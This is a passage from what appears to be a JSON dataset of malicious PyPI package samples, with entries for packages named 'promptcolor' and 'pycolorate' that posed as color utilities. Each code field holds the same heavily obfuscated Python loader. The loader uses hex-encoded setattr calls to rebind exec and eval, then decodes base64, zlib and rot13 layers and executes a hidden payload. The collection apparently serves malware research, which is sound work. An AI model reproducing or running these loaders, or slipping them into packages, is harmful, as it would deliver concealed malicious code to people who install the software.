s!IGb0B7yqrdOCV-VJ`%NU<IQNL*@lpe~WV4{O4xqncPYwVmc3r<ZovYE^;_&w>)a%Iwy5;~4n(Fs>U8zx@v-vahMvwna+%AFxdbv2Pn`lHH%L@xA-h!OLCfW((Lm@dk@fnlUkaF@Gu@F-<P=1-AuFluMKCLLK^ds3>*bz~U5Y-Z}{0FIJw&=suCp+G-F<iPl+2f9Z$sn%2hA9i6qlG{Mm!>wJGt^RPrhASZp_t9QIit(*yj7~&WrYI&quGS=5-b|O6%Y>v~wL$?QU13z&Q0IH&A`6+PYn(eCW3p2e3JgWXbiFZdq-NhURO0;9FJ_vCG;+=>KraPlyR&uke0k7B#oK#vhE{Cc^K)ZR4dS|(zK<9bU^@NdTWdmz;ytbTYf>o1hq8mtE#GW)rlLYU9W&xU}B~V!%G5P_QIRW@4Qek?Yc**;<)FGP+oiutJYj?FVzz*A+;XlO6KR?(jRY|HUVLz^4VxJEObmiM>dfE*cQ6Xg%RjB)`>hl9tDoTBSEDE=#@H%CgPd6zp$tx<z42Y)c97a~1*C8nS>rzt%NnzjILN~KRRN_lxx9vj1BnHXKk1=q8#7q+LAR~`<Mx-tXbI`W91B<JJNn#f<v4;dlSB9jYOPp`mV%j6|E^kZ$g5L-QD&1R3;u6L2g$nDqy9vb*h#I|mcBsq*6h;BtT3tPTFa^33=?GEYr4yD<47-zZDtMbl@kwCji7stJODN`!vZ^J3S>ciCb8xn0;opWT82Y!2CbI+Xcwu+zRur}$TV=?vI|EZ8G8D@n<e=J&d#KTKHDS?hCuYa)g%nC9>m*+@Zv0aZrT5q>0&UKiI5MrTK6JkW3Kzs^WD47-PP&<8R=*YL9TC1@&SuCqGVsy;$nqp3ahzTulJwQEu1XSI99H6U<MvZ8>{k+m$rbbt{jeu0'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')\n                "
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-06-promptcolor-v0.1.0",
        "code": "#pip install pycryptodome  , It works only v3.11 Above.\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\n\nobfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(AES)'],['''hJ7!9d#Z_vWXsd2`TRt&QZUg#5hgtt|1#}4`4vsUk7qWb{4rY_w(vv9Ua3r}BC2Ee$_Ktls)2TJoRo}w;UdTdeyDwc8=HxB(H8(MZx_M^t>eD9RMpATD=HQM5z%>wRdtYNC;D$8W;j$FQ$H-8w^J#Xs?#}D%LwB0ul?Z^DlSe>jU2S0Lkg7<1bW9DyPPZGFzf#XUdvx&_@d?M5wF1dKe2O?rZFNXuH2my8hxCi?;{C`y@ZBsSNRKwMA>qbB_J<<x#d>Le<n*vbj7IT0P}j-Mc=1Of=xF`wsTP5o<m)BRHtSeZAqalraxJ<79ok<Z<Sw-FST})r1>8NMWN%cStqlTF~4BW<2aiLw$Xl3x4wd&jXvDtsUD#sL7<JUJN))M^2S=r6XF=SFOxy5RZ|GiA(hdOhc$#T-$<GX_pUf;ye0VZHsymC3lW{&aTTl{0v$1B*QV((UQiUTaPUNcX=>#vA|<&5nL{fED7cWI;1!N1Y<^3~%9G(V`GXIoSrPy&0D$k)0w{~JWrg`mGBvL6_1o-x%-S!Dm`>)&Q{p&X!ng'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')\n                "
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-25-pycolorate-v1.0.1",
        "code": "#pip install pycryptodome  , It works only v3.11 Above.\nimport random ,base64,codecs,zlib;pyobfuscate=\"\"\n\nobfuscate = dict(map(lambda map,dict:(map,dict),['(https://pyobfuscate.com)*(import codecs)'],['''?R7+d=EKB*GSs+|7V3PfmRaT=DHx_mM@`V5lScL$#R4!f*KloRM{cj_-gcSvK8VH)oU})?1`XN>`XAK5C<b<11wT=2y8W#({o^FBth3{sFF%Fjf=L(!X?!CJ0Y#6liG3^SHpYRnUjbT%iL8T2Kd+7|0Ngj%1o>~Z!N2mQ+gRXFZ4^^8F`cdtnJjMMI|eYUGw-hXmcT#}xm#wiO<x?8L?D3-{AYOz-NReBd!T$sxnU`9;RTkrMI4Rfy~?k`C`}phv>DCw!z|@8eNn~8R{eEAnUPLdD)UEi3yatvB*M?Cv5UUpv_d16>C0+Q$DyZ!OHATMwTxmCyo*&GXA^lm&0Ki$3UI;T0!g~AF{my-mU6ebt=_SijROO`gp-0gYIaMLO21F310rNZ7N-*{Ky(|_k2&}^TY@G?roviZ1V9fQn%jlXfApL3U48tGlxmBa9p3M!F`l5x_=KgCmhd#3)^(K!j9X<96WBJW$5zGEmCt(BaqInwlTPq0mr2Mb#ViW~g_HRK*)^%FIi+I5mq=OntIqAb84S=4(qdMCQu-bfRFIy^srmqcv2My2j=C>leDpez>|?jx0Ii|eBzEfgv7I4-us*sy1k_Rs`2*%*x9egG+sg&}bTUjShe!X-(r^LdW((<${M5>TDir)94gkJslCNP#X;rQhC8=t~aSwh7W!%-+(KpJ%F36JT1fqZQk){?}&bCvzIKLC)A+ILIuG$En<6D0#emtc8E=SbM1+Kat6_J}u;yopf{gAN2XF*F<P9)jHdlL}h2@7qYuyP<$gh{YKq|nrwT^by4zJhI3QNKU#sbffvJLvCmydM~WJowgU4wTNk8G{F&Iw0fbMWCY2;z+)b3x@CaVo&yHu-X6?e}_crMhB<MzKgipSG41FnVH$$2ovBRdXJdBHawr&wlt+*!>KlDgJsmBtr`v~ox&sIz<D3Ih}=DZ%Mv8jDXIjY2Mc^6B)#Yw|6Wk2BzPf4Zfu{5_?Cx0!gW<p8a*#kl1Qp)?g7G#<Anl)<q$UJUd(Nkm(s0{1;)s88{t$iHDti4lkT=ws5Yx~ql{G5QxgE|9xlaW)l^zpJ`%DpCB43<S0~>zUH~UU)144uB%%%S|BCIi2qQ0;1FaWdY}TP<mn8+Y`4k-@ZF^8UVe1jwNMuEX-N7Z~&ZoLR3y@W+FL%~NXL`mCH(*ofPd1#@f3#3GO<zgs=Z^h;s!C<auspbe&%#(X7KE$I>UE^P|AF)JS6&f-{Epmm`U^lSqV)L}bU_xCYq1bVgan~l0)v>xKxNzP*?+9j^@OuWQeOuu{KxXW`V(&(Gn#z?FfTq|w23ip19DI1G9|UFuB{atiXks8uC4I^kg+$H<>*f`iCA1HvXcleeQi`<l=AE>TLk}F9SooFwi*<RG#`0(TmE07SON6%2FW6)a+VH=u-|V@XiG@~Y4#_xU)+U05h9JyO;JhlPI!n`Jksz62koM!hJN^&TFw004H1_A#ukv5=j5sif)_fMC&G=9Go){fjbe*JUphd_T@rLpg^Ot@a%TI$M2Ph0%_+^y^NUliD9@W5q|gYx>J#hht%9r#`Dk_1e15BT+Xp=o>b_3Mro0bO{Doq*@&'''.replace('\\n','')]))\n\n_=lambda OO00000OOO0000OOO,c_int=100000:(_OOOO00OO0O00O00OO:=''.join(chr(int(int(OO00000OOO0000OOO.split()[OO00O0OO00O0O0OO0])/random.randint(1,c_int)))for OO00O0OO00O0O0OO0 in range(len(OO00000OOO0000OOO.split()))));eval(\"\".join(chr(i) for i in [101,120,101,99]))(\"\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x70\\x72\\x69\\x6e\\x74\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x78\\x65\\x63\\x29\\x3b\\x73\\x65\\x74\\x61\\x74\\x74\\x72\\x28\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f\\x2c\\x22\\x5f\\x5f\\x5f\\x5f\\x22\\x2c\\x65\\x76\\x61\\x6c\\x29\");__='979810 1451856 701556 1738286 1131928 777130 1808384 498944 2412960 956032 5915082 4357878 1155399 7076716 1096768 9607464 9704686 8048651 10662561 1351885 10886705 8237044 10331370 2165024 3365775 5799018 9212000 7813401 8233080 4307776 413344 10165379 4025860 4757856 496170 8060709 69960 5328081 7099189 6536544 7959920 2806214 277950 2559104 3012032 223936 591552 9962610 1436600 1625456 5192577 4043064 1416280 3080162 10471440 6462330 4343136 2861440 1741845 8975890 6851585 8140764 7802292 6122736 7539372 1359648 9536670 5335931 10511938 8937513 8056265 3637565 11016172 9717960 2552320 8763000 5587068 5512540 5299392 7436676 73124 10753765 8257920 1823360 9609948 4267890 564456 6065252 6855276 2748352 9834944 10534233 2795264 3236514 8647560 2677500 2522768 1586610 593434 616840 3060576 1538592 2229792 888544 595650 2166095 8397585 3274687 9948176 10319226 8029134 988668 6288620 1453785 2948200 3892980 10434410 4555166 9248990 1916577 3145315 3322534 5188572 7018320 5191305 5482508 3161360 3897952 174690 174590 5850618 2819556 3904427 2454325 9440720 9722790 10612894 2934736 1090686 1106370 8736540 964630 6486220 3989560 2202214 9069498 6645901 10245258 1684332 957682 544295 2842464 7583445 1981316 411517 194212 7295387 3013234 2510936 2828240 1167492 6193408 7805872 5476708 141792 5740225 5395508 4244946 2757725 9101568 10933439 7474074 8554518 4915482 1759329 898380 1844271 7482580 1039824 2242907 3913312 3144240 6702624 4845377 1374656 2064839 5705995 10300550 799434 9605960 8718120 1926528 1534284 2298665 414460 4306036 5724579 5008440 10100004 850660 8166980 6718020 7659663 1681362 488180 897888 756320 2823680 2456672 8309532 3951354 1671882 9611838 463904 1850592 3953815 1540586 1030624 5078241 2462680 8585512 2845632 2321235 355449 10672704 4871568 7530612 1852288 2691680 6459657 11642040 8839320 8637305 1195148 6157790 110976 6754401 10835875 3180288 4157867 10836840 795840 2778016 3047136 237664 18144 381174 4659978 1121877 9624264 2864672 986235 5340830 1642784 9477825 7475656 6378288 3466419 8494824 9749916 1930336 9773876 7674586 3866628 8029500 5434880 53218 2066016 6873517 2529885 2371328 9361876 4234930 1051952 9138354 1909910 4875025 4505490 3837832 8355225 438360 446368 1353568 2047008 2967488 10644804 4894212 7748136 703635 399743 7393907 3952600 3082911 5642000 5450960 7519200 4187848 1696630 5786256 5735665 169650 393313 3621538 3350704 1566824 2943433 7939188 4003881 967527 561064 990896 7872992 2789992 9179304 2780328 7594255 3794678 11010256 6994920 858864 2798948 2737895 5301632 4816300 2089555 9550224 8589846 8282736 710704 669460 1008320 4040180 4468458 4526055 3835186 3264666 1978960 11074200 9351688 2573086 423030 8277360 4632789 3426248 8649396 1341102 8535879 693289 70924 2222352 1938440 6407820 2503992 1014875 64400 4158814 6867432 11765640 7300228 896852 19830 396530 776928 1859904 1439168 67424 7429485 4829190 2985568 10064246 2184600 2413040 11045328 596428 793637 2391017 4416766 3764460 7478286 3906981 3338151 4907438 956510 1275136 83360 189056 859712 1119680 2407648 1855712 1930560 3580398 4905469 1308763 8720493 958750 2926374 703640 8119664 2026297 873341 410140 1330848 2057856 1774592 3048704 8564194 2723652 9627975 5140800 356544 8023440 8511960 1907960 8897280 1348550 2127408 4270610 2250839 5447652 4603434 8320689 4657918 1042434 877720 2696992 2977088 183296 458144 2275808 1242208 3007648 1647168 1716726 4057473 5110029 9255513 9648978 3760028 287880 1350832 576600 2926908 369780 135296 1752416 1471232 875008 417270 5899068 1957344 2283105 10560840 2661960 5444880 471852 155062 4971561 1012478 3930990 231442 192024 2492510 9757105 4498654 382150 671456 52192 192128 1092704 1805248 1929824 3051008 1404544 5733063 8413230 310532 4281784 47008 9891543 469728 6724580 7874240 123880 10211310 9466528 3691092 1031920 4662784 1366698 2876068 684728 1890876 5409383 87924 3339696 1271776 7161413 10515830 1596832 1374105 1571104 8689434 1980668 982940 695172 1856190 4762496 9664185 1719160 3392730 7284220 4214010 2232560 1050090 4511592 2763072 128617 414570 2823840 562016 3152448 2986944 9496020 617040 5896582 230571 3810280 10790754 11111184 4286945 10453520 94200 4224528 1214400 969445 1756234 1314192 9029097 3589970 7198400 915720 3425796 2037495 774890 1417344 1112032 2954944 2494880 751210 6317954 8358360 3763386 2488337 10677968 7769448 1700038 452600 1426976 2920480 1503808 1830496 4385723 11152920 2126353 4189185 1188120 3739320 8386524 3130596 56230 777830';why,are,you,reading,this,thing,huh=\"\\x5f\\x5f\\x5f\\x5f\",\"\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\",\"\\x28\\x22\\x22\\x2e\\x6a\\x6f\",\"\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\",\"\\x31\\x30\\x31\\x2c\\x39\\x39\",\"\\x5f\\x5f\\x29\\x29\",\"\\x5d\\x29\\x29\\x28\\x5f\\x28\";b='eJxzLPfLigoMM47KDct2CvQwdXQPynEMrDAGAGNCB8A=';____(\"\".join (chr (int (OO00O0OO00O0O0OO00 /2 ))for OO00O0OO00O0O0OO00 in [202 ,240 ,202 ,198 ] if _____!=______))(f'\\x5f\\x5f\\x5f\\x5f\\x28\\x22\\x22\\x2e\\x6a\\x6f\\x69\\x6e\\x28\\x63\\x68\\x72\\x28\\x69\\x29\\x20\\x66\\x6f\\x72\\x20\\x69\\x20\\x69\\x6e\\x20\\x5b\\x31\\x30\\x31\\x2c\\x31\\x32\\x30\\x2c\\x31\\x30\\x31\\x2c\\x39\\x39\\x5d\\x29\\x29({____(base64.b64decode(codecs.decode(zlib.decompress(base64.b64decode(b\"eJw9kN1ygjAUhF8JIkzlMo6mEnIcHVIM3AGtoPIT2wSSPH2p7fTu252d2T3n3MkyK896dLvrSMIeaGxEGn0l/rpiLu3hlXm5yxDmO8tQZIDoeUQLr4oWePxk8VZfBpr9af8mXdzLTk8swRbP25bNzPvP8qwWJDRA8RX4vhLkfvuk0QRl3DOUekDC9xHZVnBcyUnXY7mtBrIOBDEKXNRl3KiBBor25l5MN7U5qSA/HsJiVpfsVIQ/Hj4dgoSYOndx+7tZLZ2m3qA4AFpUD6RDsbLXB2m0dPuPZa8GblvoGm/gthdI+8PxyYtnXqRLl9uiJi+xBbqtCmKm8/K3b7hsbmQ=\")).decode(),\"\".join(chr(int(i/8)) for i in [912, 888, 928, 392, 408])).encode()))})')\n                "
      },
      {
        "file_path": "/media/zxr/Elements/malicious-software-packages-dataset/samples/pypi/2023-04-26-pymulticolor-v1.0.0",
